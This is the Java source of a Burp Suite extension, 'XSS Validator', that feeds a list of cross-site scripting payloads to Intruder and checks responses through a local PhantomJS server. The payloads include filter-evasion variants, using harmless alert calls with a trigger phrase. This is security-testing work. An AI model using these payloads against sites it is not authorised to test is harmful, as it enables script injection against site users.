package burp;

import java.awt.Component;
import java.awt.BorderLayout;
import java.awt.Dimension;
import java.io.PrintWriter;
import java.util.List;

import javax.swing.JButton;
import javax.swing.JPanel;
import javax.swing.JTabbedPane;
import javax.swing.SwingUtilities;
import javax.swing.JTextField;
import javax.swing.JLabel;

import java.util.ArrayList;

import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.util.EntityUtils;
import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;

import org.apache.commons.codec.binary.Base64;

import burp.ITab;

public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IIntruderPayloadGeneratorFactory, IIntruderPayloadProcessor	{
	public burp.IBurpExtenderCallbacks mCallbacks;
	private IExtensionHelpers helpers;
	private PrintWriter stdout;
    private PrintWriter stderr;
    
    private HttpClient client;
    
    // Default server location for phantomJS Server
    // User can adjust this location by using the xssValidator
    // tab within Burp.
    private static String phantomServer = "http://127.0.0.1:8093";
    
    private static String triggerPhrase = "f7sdgfjFpoG";
    private static String grepPhrase = "fy7sdufsuidfhuisdf";
    
    public JPanel mainPanel, serverConfig;
    public JTextField phantomURL, grepVal;
    public JTabbedPane tabbedPane;
    public JButton btnAddText,btnSaveTabAsTemplate,btnRemoveTab;
	
    /**
     * Initial Payloads containing trigger phrase. 
     * 
     * The phantom server is designed to report XSS only if the
     * function calls contain the trigger phrase, suggesting
     * that it was passed via the Burp payload.
     * 
     * This is used to reduce the likelihood of false-positives.
     */
    public static final byte[][] PAYLOADS = {
		("<script>alert('" + triggerPhrase + "')</script>").getBytes(),
		("<scr ipt>alert('" + triggerPhrase + "')</scr ipt>").getBytes(),
		("\"><script>alert('" + triggerPhrase + "')</script>").getBytes(),
		("\"><script>alert('" + triggerPhrase + "')</script><\"").getBytes(),
		("'><script>alert('" + triggerPhrase + "')</script>").getBytes(),
		("'><script>alert('" + triggerPhrase + "')</script><'").getBytes(),
		("<SCRIPT>alert('" + triggerPhrase + "');</SCRIPT>").getBytes(),
		("<scri<script>pt>alert('" + triggerPhrase + "');</scr</script>ipt>").getBytes(),
		("<SCRI<script>PT>alert('" + triggerPhrase + "');</SCR</script>IPT>").getBytes(),
		("<scri<scr<script>ipt>pt>alert('" + triggerPhrase + "');</scr</sc</script>ript>ipt>").getBytes(),
		("\";alert('" + triggerPhrase + "');\"").getBytes(),
		("';alert('" + triggerPhrase + "');'").getBytes(),
		(";alert('" + triggerPhrase + "');").getBytes(),
		("<SCR%00IPT>alert(\\\"" + triggerPhrase + "\\\")</SCR%00IPT>").getBytes(),
		("<SCRIPT>a=/" + triggerPhrase + "/").getBytes(),
		("\\\";alert('" + triggerPhrase + "');//").getBytes(),
		("<STYLE TYPE=\"text/javascript\">alert('" + triggerPhrase + "');</STYLE>").getBytes(),
		("<scr\nipt>alert('" + triggerPhrase + "')</scr\nipt>").getBytes(),
		("<scr\nipt>alert('" + triggerPhrase + "')</scr\nipt>").getBytes(),
		("<<SCRIPT>alert('" + triggerPhrase + "')//<</SCRIPT>").getBytes(),	
    };
	
    // These payloads don't work in webkit, but may in slimer
    public static final byte[][] NONPAYLOADS = {
    	("<img src=x onerror=alert('" + triggerPhrase + "')>").getBytes(),
		// Needs to be further tested -- may only work in slimer
		("<svg xmlns=\"http://www.w3.org/2000/svg\"><g onload=\"javascript:alert('" + triggerPhrase + "')></g></svg>").getBytes(),
		// This may break things too, need to test
		("&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x27;" + triggerPhrase + "&#x27;&#x29;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;").getBytes()
		// The following should be working, but it's not. On a plane and can't look at documentation
		// Base64.encodeBase64("<script>alert('" + triggerPhrase + "')</script>")
    };
    
	public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
		mCallbacks = callbacks;
		
		this.client = HttpClientBuilder.create().build();
		helpers = callbacks.getHelpers();
		callbacks.setExtensionName("XSS Validator Payloads");
		stdout = new PrintWriter(callbacks.getStdout(), true);
        stderr = new PrintWriter(callbacks.getStderr(), true);
		callbacks.registerIntruderPayloadGeneratorFactory(this);
		callbacks.registerIntruderPayloadProcessor(this);
		callbacks.registerHttpListener(this);
		
		// Handle all the GUI stuff.
		// This should probably be moved to a separate class
		SwingUtilities.invokeLater(new Runnable(){
        	@Override
        	public void run(){
        		//Create our initial UI components
                mainPanel = new JPanel(new BorderLayout());
                
                serverConfig = new JPanel();
                serverConfig.setPreferredSize(new Dimension(400, 400));
                
                phantomURL = new JTextField(20);
                phantomURL.setText(phantomServer);	
                
                grepVal = new JTextField(20);
                grepVal.setText(grepPhrase);
        	    
                JLabel heading  = new JLabel("PhantomJS Server Settings");
                JLabel grepHeading = new JLabel("Grep Phrase");
                serverConfig.add(heading);
                serverConfig.add(phantomURL);
                
                serverConfig.add(grepHeading);
                serverConfig.add(grepVal);
                
                mainPanel.add(serverConfig);
        		mCallbacks.customizeUiComponent(mainPanel);
        		mCallbacks.addSuiteTab(BurpExtender.this);
        	}
        });
	}
	
	public String getTabCaption() {
		return "xssValidator";
	}

	@Override
	public Component getUiComponent() {
		return mainPanel;
	}
	
	@Override
	public String getGeneratorName() {
		return "XSS Validator Payloads";
	}
	
	@Override
    public IIntruderPayloadGenerator createNewInstance(IIntruderAttack attack)
    {
        // return a new IIntruderPayloadGenerator to generate payloads for this attack
        return new IntruderPayloadGenerator();
    }
    
    @Override
    public String getProcessorName() {
        return "XSS Validator";
    }
    
    @Override
    public byte[] processPayload(byte[] currentPayload, byte[] originalPayload, byte[] baseValue) {
    	return helpers.stringToBytes(helpers.urlEncode(helpers.bytesToString(currentPayload)));
    }
    
    /**
     * This function is called every time Burp receives an HTTP message.
     * We look specifically at messages that contain a toolFlag of 32,
     * indicating that the message is intended for the intruder. If it's
     * not, we don't care about it.
     * 
     * The function currently ignores requests, and handles only HTTP
     * responses. The response is captured and encoded, then passed
     * along to the phantomJS server for processing.
     * 
     * If the phantomJS server indicates a successful XSS attack,
     * append the phrase 'fy7sdufsuidfhuisdf' to the response.
     * 
     * We then use this phrase in accompaniment with intruders grep-match
     * functionality to determine whether the specific payload triggered
     * xss.
     */
	public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo) {
        if (toolFlag == 32 && messageIsRequest) {
        	// Manipulate intruder request, if necessary
        } else if (toolFlag == 32 && ! messageIsRequest) {
        	HttpPost PhantomJs = new HttpPost(phantomURL.getText());
        	
        	try {
        		// Base64 encode the intruder response, then send to phantomJS
        		byte[] encodedBytes = Base64.encodeBase64(messageInfo.getResponse());
        		String encodedResponse = helpers.bytesToString(encodedBytes);
        		
	        	List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(1);
	        	nameValuePairs.add(new BasicNameValuePair("http-response", encodedResponse));
	        	
	        	PhantomJs.setEntity(new UrlEncodedFormEntity(nameValuePairs));

	        	// Retrieve response from phantomJS and process
	        	HttpResponse response = client.execute(PhantomJs);
	        	String responseAsString = EntityUtils.toString(response.getEntity());
	            
            	stdout.println("Response: " + responseAsString);
            	
	            // parse response for XSS by checking whether it contains 
            	// the trigger phrase
	            if(responseAsString.toLowerCase().contains(triggerPhrase.toLowerCase())) {
	            	// Append weird string to identify XSS
		            String newResponse = helpers.bytesToString(messageInfo.getResponse()) + grepVal.getText();
	            	messageInfo.setResponse(helpers.stringToBytes(newResponse));
	            	stdout.println("XSS Found");
	            }
	            
        	} catch (Exception e) {
        		stderr.println(e.getMessage());
        	}
        }
	}
	
	/**
	 * 
	 * Basic class to generate intruder payloads.
	 * 
	 * In this case, simply iterate over the payloads defined
	 * in the parent class.	
	 */
	class IntruderPayloadGenerator implements IIntruderPayloadGenerator {
		int payloadIndex;
		
		@Override
		public boolean hasMorePayloads() {
			return payloadIndex < PAYLOADS.length;
		}
		
		@Override
		public byte[] getNextPayload(byte[] baseValue) {			
			byte[] payload = PAYLOADS[payloadIndex];
			payloadIndex++;
			return payload;
		}
		
		@Override
		public void reset() {
			payloadIndex = 0;
		}
		
	}
}
